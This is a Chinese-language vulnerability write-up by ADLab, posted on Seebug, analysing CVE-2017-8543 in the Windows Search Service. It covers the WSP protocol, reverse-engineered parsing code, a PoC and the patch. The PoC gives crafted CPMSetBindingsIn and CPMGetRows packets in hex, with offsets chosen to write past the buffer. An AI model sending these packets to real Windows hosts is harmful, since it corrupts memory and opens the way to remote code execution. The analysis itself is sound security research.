作者：启明星辰ADLab

#### 1\. 漏洞描述

2017年6月，微软发布的补丁修复了多个远程执行漏洞，其中包括 CVE-2017-8543 Windows Search
搜索漏洞（CNVD-2017-09381，CNNVD-201706-556），该漏洞几乎影响所有的 Windows 操作系统。对于 Windows XP 和
Windows Server 2003 等停止更新的系统，微软也发布了对应的补丁，用户可以手动下载补丁进行安装。

Windows 搜索服务（Windows Search Service，WSS）是 Windows
的一项默认启用的基本服务，用于建立和维护文件系统索引。由于 WSS 在解析搜索请求时，存在内存越界漏洞，可能导致远程代码执行。

#### 2\. 协议分析

当客户端对远程主机发起搜索请求后，它们之间使用 Windows 搜索协议（Windows Search
Protocol，WSP）进行数据交互。交互的消息序列如下所示。其中，CPMConnectIn 消息中包括服务器的名称和索引名称（默认
Windows\SYSTEMINDEX）。服务器验证客户端的权限后建立会话，回复 CPMConnectOut 消息； CPMCreateQueryIn
消息用于设置查询的文件目录范围、关键字信息等； CMPSetBindingsIn 消息用于设置返回的查询结果内容，例如文件名称、文件类型等；
CPMGetRowsIn 消息用于请求查询结果。

![](https://images.seebug.org/content/images/2017/07/CVE-2017-8543-----POC
---------ADLab633.png-w331s)

以上信息的 Header 需遵循以下格式，Header 大小为 0x10。

![](https://images.seebug.org/content/images/2017/07/CVE-2017-8543-----POC
---------ADLab669.png-w331s)

其中，`_msg` 表示消息类型，常用的消息类型如下所示。

![](https://images.seebug.org/content/images/2017/07/CVE-2017-8543-----POC
---------ADLab698.png-w331s)

与该漏洞成因相关的两个消息是 `CPMSetBindingsIn` 和 `CPMGetRowsIn`。

首先介绍 `CPMSetBindingsIn` 消息，消息的格式如下所示。

    
    
    struct CPMSetBindingsIn
    {
        int msg_0;
        int status_4;
        int ulCheckSum_8;
        int ulReserved2_c;
        int hCursor_10;
        int cbRow_14;
        int cbBindingDesc_18;
        int dummy_1c;
        int cColumns_20;
        struct Column aColumns[SIZE];
    };

前 0x10 字节是消息 `Header；hCursor` 是 `CPMCreateQueryOut` 消息返回的句柄；`cbRow` 表示 `row`
的长度，以字节为单位；`aColumns` 是 `Column` 类型结构体数组；`cColumns` 是数组的长度。在这里，每一行 (row)
代表一条查询结果，每一列 (column) 代表查询结果属性，例如文件名称、文件类型等。

![](https://images.seebug.org/content/images/2017/07/----_20170719000833.png-w331s)

`CPMSetBindingsIn` 中的 `Column` 结构体定义如下：

    
    
    struct Column
    {
        struct CFullPropSpec cCFullPropSpec;
        int   Vtype;
        char  AggregateUsed;   
        char  AggregateType;
        char  ValueUsed;    
        char  padding1;
        short ValueOffset; 
        short ValueSize;   
        char  StatusUsed;     
        char  padding2;       
        short StatusOffset;    
        char  LengthUsed;     
        char  padding3;
        short LengthOffset;    
    }
        struct CFullPropSpec
        {
            char GUID[0x10];
            int ulKind;
            int PrSpec;
         }

其中，GUID 标志所代表的属性，例如 `guidFilename=E05ACF41-5AF70648-BD8759C7-D9248EB9` 代表文件名称。

![](https://images.seebug.org/content/images/2017/07/CVE-2017-8543-----POC
---------ADLab1818.png-w331s)

Vtype 表示 column 对应的数据类型。常用数据类型如下表，在 `CPMSetBindingsIn` 消息中，Vtype 一般取值 0x0c。

![](https://images.seebug.org/content/images/2017/07/----_20170719001211.png-w331s)

ValueOffset 表示在每一行 (row)，该 column 数据存放的偏移位置，ValueSize 表示这个 column 数据所占内存大小。

当收到 `CPMSetBindings` 消息时，程序调用 `DoSetBindings` 进行数据解析。`DoSetBindings` 是
`CRequestServer` 类的成员函数。 `CRequestServer` 类中还包括其他解析函数，例如
`DoCreateQuery`、`DoGetRows` 等。数据成员 `cCProxyMessage_c0` 即为接收的数据 Buffer。

    
    
    class CRequestServer
    {
    public:
            void DoConnect(unsigned long len,unsigned long &var)();     //解析CPMConnectIn消息
            void DoCreateQuery(unsigned long len,unsigned long &var);   //解析CPMCreateQueryIn消息
            void DoSetBindings(unsigned long len,unsigned long &var);   //解析CPMSetBindingsIn消息
            void DoGetRows(unsigned long len,unsigned long &var)();      //解析CPMGetRowsIn消息
        .....
    private:
        ...
            CVIQuery *pCVIQuery_5c;
            XArray *pXArray_6c;
            CProxyMessage cCProxyMessage_c0;  
    ... 
    };

`DoSetBindings` 函数的实现如下所示。

    
    
        void DoSetBindings(unsigned long len,unsigned long &var)
        {
            CPMSetBindingsIn *pCPMSetBindingsIn = &cCProxyMessage_c0;
            pCPMSetBindingsIn->ValidateCheckSum(var_40,len);
            struct CMemDeSerStream* pCMemDeSerStream = new pCMemDeSerStream((char*)pCPMSetBindingsIn);
            class CPidMapper* pCPidMapper=new CPidMapper(0);
            CTableColumnSet * pCTableColumnSet = new CTableColumnSet(pCMemDeSerStream, pCPidMapper);
            pCVIQuery_5c->SetBindings(pCPMSetBindingsIn->hCursor_10,
                pCPMSetBindingsIn->cbRow_14,
                pCTableColumnSet,
                pCPidMapper);
        }

（1）`DoSetBindings` 函数首先初始化 `pCPMSetBindingsIn` 指针，使其指向接收的 `CPMSetBindingsIn`
数据，然后使用 `pCPMSetBindingsIn` 指针初始化 `CMemDeSerStream` 类。`CMemDeSerStream`
类用于完成各个字段的读取。

![](https://images.seebug.org/content/images/2017/07/CVE-2017-8543-----POC
---------ADLab3639.png-w331s)

（2）使用 `pCMemDeSerStream` 指针初始化 `CTableColumnSet` 类。`CTableColumnSet` 类和
`CPidMapper` 类都是 `CCountedDynArray` 类的派生类。`CCountedDynArray`
是一个数组类，数据成员包含一个指针数组 `Array_4`。`CTableColumnSet` 类构造函数首先调用 `GetULong` 获得数组长度
`cColumns` 作为循环次数，然后循环解析 `aColumns` 数组元素。在 `while` 循环中：

  * 解析 column 结构中的 `CFullPropSpec` 结构，将对象指针 `&CFullPropSpec` 添加到 `CPidMapper` 中： `pCPidMapper->array_4[CurrentIndex] = &cCFullPropSpec`

  * 解析 column 结构中的其他字段，并保存到 `CTableColumn`类，将对象指针 `pCTableColumn` 添加到 `CTableColumnSet` 中：`pCTableColumnset->array_4[RetIndex] = pCTableColumn`

    
    
        CTableColumnSet(CMemDeSerStream *pCMemDeSerStream, CPidMapper* pCPidMapper)
        {
            int _ColumnCount = pCMemDeSerStream->GetULong();
            SetExactSize(_ColumnCount);
            char GUID[16]={0};
            int count = 0;
            do{
                CFullPropSpec cCFullPropSpec(pCMemDeSerStream);     //解析CFullPropSpec
                if(0==cCFullPropSpec.IsValid())
                    goto error;
                int RetIndex = pCPidMapper->NameToPid(&cCFullPropSpec,0,0);  
                CTableColumn *pCTableColumn = new CTableColumn(RetIndex,1);  //解析CTableColumn
                Add(pCTableColumn,RetIndex);            count++;
            }while(count<_ColumnCount);
        }

（3）将 `pCPidMapper` 和 `pCTableColumnset` 作为参数传入到 `CVIQuery:: SetBindings`
中。`CVIQuery:: SetBindings` 函数调用了 `CTableCursor::CheckBindings`，在 while
循环中，依次获取 `pCTableColumnset` 中的 `CTableColumn` 元素，调用 `checkBinding` 检测
`CTableColumn` 有效性。

    
    
        int CheckBindings(CTableColumnSet *pCTableColumnSet,CTableRowAlloc *pCTableRowAlloc,int cbRow) 
        {
            int index=0;
            int result;
            if(!pCTableColumnSet->CurrentIndex)
                return 0;
            while(1)
            {
                CTableColumn *pCTableColumn = pCTableColumnSet->Get(index);
                result = CheckBinding(pCTableColumn, pCTableRowAlloc, cbRow);
    
                if ( result < 0 )
                    break;
                if ( ++index >= pCTableColumnSet->CurrentIndex)
                    return 0;
            }
            return result;
        }
    
        int CheckBinding(CTableColumn *pCTableColumn,CTableRowAlloc *pCTableRowAlloc,int cbRow)
        {
            pCTableColumn->Validate(cbRow,0);
            //.......
        }

`CTableCursor::checkBinding` 调用 `CTableColumn::Validate` 进行验证，如果 `ValueSize +
ValueOffset` 大于 `cbRow`，将抛出异常，以防内存越界。

    
    
        void validate(int cbRow,bool flag)
        {
            try
            {
                if(ValueSize_06 + ValueOffset_04>cbRow)
                    throw 0x80040E08;
            }
    
        }

接下来介绍 `CPMGetRows` 消息，`CPMGetRowsIn` 消息格式如下：

    
    
    struct CPMGetRowsIn
    {   
        int msg_0;
        int status_4;
        int ulCheckSum_8;
        int ulReserved2_c;
        int hCursor_10;
        int cRowsToTransfer_14;
        int cbRowWidth_18;
        int cbSeek_1c;
        int cbReserved_20;
        int cbReadBuffer_24;
        int ulClientBase_28;
        int fBwdFetch_2c; 
        int eType_30;
        int chapt_3C;
        union
        {
            CRowSeekAt cCRowSeekAt;
            CRowSeekAtRatio cCRowSeekAtRatio;
            CRowSeekByBookmark cCRowSeekByBookmark;
            CRowSeekNext cCRowSeekNext;
        }
    }

`CPMGetRowsOut` 的消息格式如下：

    
    
    struct CPMGetRowsOut
    {
        int msg_0;
        int status_4;
        int ulCheckSum_8;
        int ulReserved2_c;
        int cRowsReturned_10;
        int eType_14;
        int chapt_18;
        //Rows_offset;
    }

在 `CPMGetRowsIn` 消息中，`cbRowWidth` 表示 `row` 长度，与 `CPMSetBindingsIn` 消息中的
`cbRow` 意义相同。`cbReadBuffer` 表示用于存放 `CPMGetRowsOut` 消息的 `buffer`
大小；`cbReserved` 表示 `Rows` 数据在 `CPMGetRowsOut` 消息中的偏移；`eType`
表示查询的方法，取值范围如下表所示。

![](https://images.seebug.org/content/images/2017/07/CVE-2017-8543-----POC
---------ADLab6489.png-w331s)

在 `CPMGetRowsOut` 消息中，对于每一行（row）中的列（column）， column 数据使用 `CTableVariant`
类表示。`CTableVariant` 结构定义如下。其中 `Vtype` 表示数据类型，取值范围见前文 `Vtype` 常用数据类型表所示。如果
`Vtype` 为字符串等变长数据类型，`offset` 则指向的该变长数据偏移位置。`CTableVariant` 结构存放在 `valueoffset`
指定的位置，变长数据则存放在内存末尾位置，在后面解析代码中进行说明。

![](https://images.seebug.org/content/images/2017/07/CVE-2017-8543-----POC
---------ADLab6725.png-w331s)

当接收 `CPMGetRowsIn` 数据，调用 `DoGetRows` 函数，函数实现如下所示。

    
    
        void DoGetRows(unsigned long len,unsigned long &var)
        {
            CMPGetRowsOut *pCMPGetRowsOut = cCProxyMessage_c0;
            CPMGetRowsIn *pCPMGetRowsIn = &cCProxyMessage_c0;
            pCPMGetRowsIn->ValidateCheckSum(var_40,len);
            char *pCPMGetRowsIn_eType_30 = &pCPMGetRowsIn->eType_30;
            char *pCPMGetRowsIn_eType_cbseek= (char *)&pCPMGetRowsIn->eType_30 +                            pCPMGetRowsIn->cbSeek_1c;
            struct CMemDeSerStream* pCMemDeSerStream = new pCMemDeSerStream(pCPMGetRowsIn_eType_30,
            *pCPMGetRowsIn_eType_cbseek);
    
            CRowSeekMethod* pCRowSeekMethod=0; 
            UnmarshallRowSeekDescription(pCMemDeSerStream,&pCRowSeekMethod,0);  
            int a2=0;
            if(pCPMGetRowsIn->cbReadBuffer_24>0x1300)                                                               pXArray_6c->init(pCPMGetRowsIn->cbReadBuffer_24);
            char * pArray = pXArray_6c->pArray_0;
            if(pArray){
                *(DWORD*)pArray = 0xcc;
                *(DWORD*)(pArray + 4) = 0;
                *(DWORD*)(pArray + 8) = 0;
                *(DWORD*)(pArray + c) = 0;
            }
            pCMPGetRowsOut = pXArray_6c->pArray_0;
            CFixedVarBufferAllocator cCFixedVarBufferAllocator(
                pCMPGetRowsOut,
                a2,
                pCPMGetRowsIn->cbReadBuffer_24,
                pCPMGetRowsIn->cbRowWidth_18,
                pCPMGetRowsIn->cbReserved_20);
            int flag =1;
            CGetRowsParams cCGetRowsParams(
                pCPMGetRowsIn->cRowsToTransfer_14,
                flag,
                pCPMGetRowsIn->cbRowWidth_18,
                &cCFixedVarBufferAllocator);
            CRowSeekMethod *pCRowSeekMethod_new;
            pCVIQuery_5c->GetRows(
                pCPMGetRowsIn->hCursor_10,
                pCRowSeekMethod,
                &cCGetRowsParams,
                &pCRowSeekMethod_new);
        }

（1）`UnmarshallRowSeekDescription` 函数根据 etype
类型（eRowSeekNext，eRowSeekAt，eRowSeekAtRatio或eRowSeekByBookmark），返回 SeekMethod
方法对象。

（2）如果 `cbReadBuffer_24` 长度大于 `0x1300`，分配新内存存放 `CMPRowsOut`， `pCMPGetRowsOut`
指向分配的地址。

（3）使用 `pCMPGetRowsOut` 指针初始化 `CFixedVarBufferAllocator`
类对象。`CFixedVarBufferAllocator` 构造函数如下所示。其中两个关键的数据成员： **RowBufferStart** 地址为
rows 数据的基地址， **RowBufferEnd** 表示当前可用的末尾地址。

    
    
        CFixedVarBufferAllocator(char *ReadBuffer,int a1,int cbReadBuffer,int cbRowWidth,int cbReserved)
        {
    
            pvatable_0 = &CFixedVarBufferAllocator::`vftable'{for `PVarAllocator'};
            isequal_4 = (ReadBuffer != 0);
            pvatable_8 = &CFixedVarBufferAllocator::`vftable'{for `PFixedAllocator'};
            ReadBuffer_0c = ReadBuffer;
            ReadBuffer_10 = ReadBuffer;
            var_14 = a1;
            RowBufferStart_18 = (char *)ReadBuffer + cbReserved;
            RowBufferEnd_1c = (char *)ReadBuffer + cbReadBuffer;
            cbRowWidth_20 = cbRowWidth;
            cbReserved_24 = cbReserved; 
    
            while (RowBufferEnd_1c & 7 )
            {
                --RowBufferEnd_1c;
            }
        }

（4）使用对象地址 `&cCFixedVarBufferAllocator`，`cbRowWidth` 等参数初始化 `CGetRowsParams`
对象。最后调用 `CVIQuery:: GetRows` 函数。

    
    
        int CVIQuery::GetRows(int hCursor,
            CRowSeekMethod *pCRowSeekmethod,
            CGetRowsParams *pCGetRowsParams,
            CRowSeekMethod *pCRowSeekMethod_new)
        {
            int result;
            CItemCursor *pCItemCursor = *(DWORD *)(var_68 + 4*hCursor);
            CTableCursor *pCTableCursor = pCItemCursor + 0x14;
            pCTableCursor->ValidateBindings();  //检查pCTableCursor->pCTableColumnSet_4是否为
            result = pCRowSeekmethod->GetRows(pCTableCursor,
                pCItemCursor,
                pCGetRowsParams,
                pCRowSeekMethod_new);
            return result;
            //.................
        } 

假设 `etype=eRowSeekAt`，则 `pCRowSeekmethod` 指针 `CRowSeekAt` 类指针。此时函数调用序列：

    
    
    CVIQuery::GetRows->CRowSeekAt:: GetRows->CVICursor:: GetRowsAt

`CVICursor:: GetRowsAt` 函数实现如下所示。其中，参数 `pCTableColumnSet` 是由前面的
`DoSetBindings` 函数构造。在 while 循环中：

  * 调用 `CFixedVarBufferAllocator::AllocFixed` 获取当前行 (row) 存放的基地址 RowBufferBase。
  * 调用 `CItemCursor::GetRow` 依次获取每一行(row)数据。

    
    
        int CVICursor::GetRowsAt(int hRegion,
            int bmkOffset,
            int chapt,
            int cskip,
            CTableColumnSet *pCTableColumnSet,
            CGetRowsParams *pCGetRowsParams,
            int *pbmkOffset)
        {
            int result;
            int fBwdFetch = pCGetRowsParams->fBwdFetch_14;
            //this=pCItemCursor
            while(pCGetRowsParams->cRowsToTransfer_0!=pCGetRowsParams->cRowsAlreadyGet_4&&!result) 
            {
                char *RowBufferBase = pCGetRowsParams->pCFixedVarBufferAllocator_8->AllocFixed();
                int index=0;
                result = ((CItemCursor*)this)->GetRow(index, pCTableColumnSet, pCGetRowsParams,                     RowBufferBase);
                if(!result)
                {
                    pCGetRowsParams->cRowsAlreadyGet_4++;
                    pCGetRowsParams->var_10 = 0;
                    *pbmkOffset = index + 1;
                    if(fBwdFetch)
                        index++;
                    else
                        index--;
                }
    
            }
        }
        --------------------------------------------------------------------------------------------        char* CFixedVarBufferAllocator::AllocFixed()
        {
            char *result = RowBufferStart_18;
            try
            {
                if(RowBufferEnd_1c - RowBufferStart_18 < cbRowWidth_20)
                    throw 0xC0000023;
                RowBufferStart_18 += cbRowWidth_20;
            }
            return result;
        }

`CItemCursor::GetRow` 调用 `CWIDToOffset:: GetItemRow`，代码如下所示。`CWIDToOffset::
GetItemRow` 函数循环写入 column 数据。在 while 循环中：

  * 首先，从 `CTableColumnSet` 数组中取出 `CTableColumn`；
  * 然后，计算 Column 存放地址 `pCTableVariant`， `pCTableVariant` 地址等于行基址 `RowBufferBase` 加上该 column 的偏移 ValueOffset。
  * 最后，调用 `CTableVariant::CopyOrCoerce`，将 Column 数据写入到 `pCTableVariant` 地址中。

    
    
        int CItemCursor::GetRow(int index, CTableColumnSet *pCTableColumnSet, CGetRowsParams    *pCGetRowsParams, char*     RowBufferBase)
        {
            int value = psegvec_34->Get(index); //1=get(0);
            CWIDToOffset *pCWIDToOffset = *(DWORD*)(pCVIQuery_10->var_7c);
            return pCWIDToOffset->GetItemRow(index,value,pCTableColumnSet, pCGetRowsParams,     RowBufferBase);
    
        }
    ------------------------------------------------------------------------------------------        int CWIDToOffset::GetItemRow(int index, int value,CTableColumnSet *pCTableColumnSet,    CGetRowsParams *pCGetRowsParams, char* RowBufferBase)
        {
            //...........
            int index=0;
            CTableVariant *pCTableVariant;
            while(index<pCTableColumnSet->len_0)
            {
    
                //............
                CTableColumn* pCTableColumn = pCTableColumnSet->Get(index_column);
                int var5;
                pCTableVariant = (CTableVariant*)(RowBufferBase + pCTableColumn->ValueOffset_04);
    
                CTableVariant::CopyOrCoerce(pCTableVariant,
                    pCTableColumn->ValueSize_06,
                    pCTableColumn->Vtype_0E,
                    &var5,
                    pCGetRowsParams->pCFixedVarBufferAllocator_8);//写入列属性数据
            }
        }

在 `CTableVariant::CopyOrCoerce` 函数中，当 `vtype=0x0c`，首先调用 `VarDataSize`
函数，返回变长数据大小 size。

  * 如果 column 为定长数据，size=0， 直接填充 `pCTableVariant` 指针数据。

    
    
        void CTableVariant::CopyOrCoerce(CTableVariant *pCTableVariant,int ValueSize,int Vtype,int  *var5,CFixedVarBufferAllocator* pCFixedVarBufferAllocator)
        {
            //..........
            if(Vtype==0x0c)
            {
                int size = VarDataSize();
                Copy(pCTableVariant, pCFixedVarBufferAllocator, size, 0);
            }
            //.........
        }
        void CTableVariant::Copy(CTableVariant *pCTableVariant,CFixedVarBufferAllocator* pCFixedVarBufferAllocator,int  size,int a4)
        {
            //............
            if(size)
                CTableVariant::CopyData(pCFixedVarBufferAllocator, size, a4);
            pCTableVariant->vtype=vtype;
            pCTableVariant->reserved1=reserved1;
            pCTableVariant->reserved2=reserved2;
            pCTableVariant->offset=offset;
        }

  * 如果 column 为变长数据，`size>0`。函数调用序列如下：`CTableVariant::CopyData-> PVarAllocator::CopyTo-> CFixedVarBufferAllocator::Allocate`

调用 `CFixedVarBufferAllocator::Allocate` 获取字符串存放地址：首先计算是否存在足够的存储空间，从
`RowBufferEnd_1c` 位置向前寻找存储空间存放字符串：`RowBufferEnd_1c =
RowBufferEnd_1c-size`；然后调用 `memcpy` 拷贝字符串。

    
    
        void * CopyTo(int size, char *src)
        {
            char *buffer = Allocate(size);
            memcpy(buffer, Src, Size);
            return buffer;
        }
    
        void* CFixedVarBufferAllocator::Allocate(int size)
        {
            try
            {
                if(RowBufferEnd_1c-RowBufferStart_18<size)
                    throw 0xC0000023;
    
            }
            RowBufferEnd_1c = RowBufferEnd_1c-size;
            return RowBufferEnd_1c;
        }

查询结果数据 `CPMGetRowsOut` 在内存中的状态如下图所示。可以看出，rows 中的变长数据存放在 Buffer
末尾位置，且以地址递减的方式进行存放。

![](https://images.seebug.org/content/images/2017/07/CVE-2017-8543-----POC
---------ADLab14009.png-w331s)

#### 3\. POC 与漏洞分析

实验环境如下表：

![](https://images.seebug.org/content/images/2017/07/----_20170719003111.png-w331s)

在 client 端，附件->运行，输入
`“\\servername”`，回车，即可看到共享文件夹。打开文件夹，在搜索框里输入关键字进行搜索，这个搜索过程会产生一系列的 WSP 消息交互序列。

![](https://images.seebug.org/content/images/2017/07/CVE-2017-8543-----POC
---------ADLab14200.png-w331s)

可以通过中间人的方式，修改数据包来重现这个漏洞。修改 `CPMSetBindingsIn` 和 `CPMGetRows` 消息，如下所示。

    
    
    char CPMSetBindingsIn[] =
    "\xd0\x00\x00\x00\x00\x00\x00\x00\x7c\x19\x35\xbd\x00\x00\x00\x00"
    "\x01\x00\x00\x00"  //_hCursor
    "\x78\x07\x00\x00" //_cbRow
    "\x34\x00\x00\x00"//_cbBindingDesc
    "\x50\x39\xee\x69"
    
    "\x01\x00\x00\x00"  // cbRow
    
    "\x70\x39\xee\x69" //padding
    
    "\x90\x1c\x69\x49\x17\x7e\x1a\x10\xa9\x1c\x08\x00\x2b\x2e\xcd\xa9" //GUID
    "\x01\x00\x00\x00"
    "\x05\x00\x00\x00"
    
    "\x0c\x00\x00\x00"
    "\x01\x00"
    "\x01\x00"
    "\x60\x07"  //ValueOffset
    "\x10\x00"  //ValueSize
    "\x01\x00"
    "\x02\x00"
    "\x01\x00"
    "\x04\x00";
    char CPMGetRows[] =
    "\xcc\x00\x00\x00\x00\x00\x00\x00\xae\x12\xfd\x5c\x00\x00\x00\x00"
    "\x01\x00\x00\x00" //#+0x010 _hCursor
    "\x20\x00\x00\x00" //#+0x014 _cRowsToTransfer
    "\x02\x07\x00\x00"//#+0x018 _cbRowWidth
    "\x14\x00\x00\x00" //#+0x01c _cbSeek
    "\xee\x38\x00\x00"// #+0x020 _cbReserved
    "\x00\x40\x00\x00" //#+0x024 _cbReadBuffer
    "\x58\xe8\xad\x05" //#+0x028 _ulClientBase
    "\x00\x00\x00\x00" //#+0x02c _fBwdFetch 
    "\x02\x00\x00\x00" //eType,eRowSeekAt
    "\x00\x00\x00\x00" //_chapt
    
    "\xfc\xff\xff\xff"//_bmkOffset
    "\x00\x00\x00\x00"//_cskip
    "\x00\x00\x00\x00";//_hRegion
    
    cbReadBuffer=0x4000
    RowBufferBase = ReadBuffer + _cbReserved = ReadBuffer + 0x38ee
    CTableVariant *pCTableVariant = RowBase + valueoffset = ReadBuffer+0x38ee+0x760 = ReadBuffer + 404e

而 ReadBuffer 大小为 0x4000，因此向 column 中写入数据时，将发生地址越界。

其实，在前面获取 RowBufferBase 的 `CFixedVarBufferAllocator::AllocFixed` 函数中，是进行了合法检查的。

    
    
        char* CFixedVarBufferAllocator::AllocFixed()
        {
            char *result = RowBufferStart_18;
            try
            {
                if(RowBufferEnd_1c - RowBufferStart_18 < cbRowWidth_20)
                    throw 0xC0000023;
                RowBufferStart_18 += cbRowWidth_20;
            }
            return result;
        }

但是由于 GetRowsIn 中的 cbRowWidth 本身是不可信的，可以任意赋值，因此可以绕过该检查触发漏洞。

#### 4\. 补丁分析

补丁对 `CVIQuery::GetRows` 函数代码进行修改。在调用 `pCRowSeekmethod->GetRows` 函数前，对
`cbRowWidth` 的合法性进行判断。其中，`pCTableCursor->cbRow_2` 值为 `CPMSetBindingsIn` 消息中的
`cbRow` 。

    
    
        int CVIQuery::GetRows(int hCursor,
            CRowSeekMethod *pCRowSeekmethod,
            CGetRowsParams *pCGetRowsParams,
            CRowSeekMethod *pCRowSeekMethod_new)
        {
            int result;
            CItemCursor *pCItemCursor = *(DWORD *)(var_68 + 4*hCursor);
            CTableCursor *pCTableCursor = pCItemCursor + 0x14;
            pCTableCursor->ValidateBindings();
    
            if(pCTableCursor->cbRow_2 != pCGetRowsParams->cbRowWidth_c)
                return 0x80070057;
            result = pCRowSeekmethod->GetRows(pCTableCursor,
                pCItemCursor,
                pCGetRowsParams,
                pCRowSeekMethod_new);
            return result;
            //.................
        } 

* * *

**启明星辰积极防御实验室（ADLab）**

ADLab成立于1999年，是中国安全行业最早成立的攻防技术研究实验室之一，微软MAPP计划核心成员。截止目前，ADLab通过CVE发布Windows、Linux、Unix等操作系统安全或软件漏洞近300个，持续保持亚洲领先并确立了其在国际网络安全领域的核心地位。实验室研究方向涵盖操作系统与应用系统安全研究、移动智能终端安全研究、物联网智能设备安全研究、Web安全研究、工控系统安全研究、云安全研究。研究成果应用于产品核心技术研究、国家重点科技项目攻关、专业安全服务等。
![](https://images.seebug.org/content/images/2017/05/adlab.png-w331s)

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/355/>

